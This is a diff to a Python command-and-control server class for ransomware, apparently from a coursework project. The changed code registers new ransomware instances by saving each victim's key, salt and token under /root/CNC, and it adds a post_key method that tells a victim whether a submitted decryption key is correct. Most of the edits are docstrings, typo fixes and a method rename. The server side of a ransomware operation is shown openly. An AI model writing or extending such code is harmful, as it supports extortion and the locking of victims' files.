@@ -18,13 +18,15 @@ class CNC(CNCBase):
             f.write(bin_data)
 
     def post_new(self, path:str, params:dict, body:dict)->dict:
-        # used to register new ransomware instance
+        """
+         Used to register new ransomware instance
+        """
 
         key = base64.b64decode(body["key"])
         salt = base64.b64decode(body["salt"])
         token = base64.b64decode(body["token"])
         
-        #cration of the directory
+        #creation of the directory
         os.makedirs('/root/CNC', exist_ok=True)
         folder_name = "/root/CNC/" + str(token.hex())
 
@@ -37,10 +39,16 @@ class CNC(CNCBase):
 
         return {"status":"KO"}
 
-    def check_key_candidate(self,path:str, params:dict, body:dict)->dict:
+    def post_key(self, path:str, params:dict, body:dict)->dict:
+        """
+         Method used to assert if the key is valid
+        """
 
-        token = base64.b64decode(body['token'])
-        folder_name = "/root/CNC/" + token.hex()
+        # retrive the token from the json send by the victim
+        # in order to choose the corect folder
+
+        token = body['token']
+        folder_name = "/root/CNC/" + token
         key_file = folder_name + "/key.bin"
 
         key_candidate = base64.b64decode(body["key"])
@@ -50,6 +58,8 @@ class CNC(CNCBase):
             key = file.read()
             file.close()
 
+            # If the key match the one in the key.bin file we send '1' which mean the key
+            # is correct
             if key == key_candidate:
                 return {"valide":1}
             else:
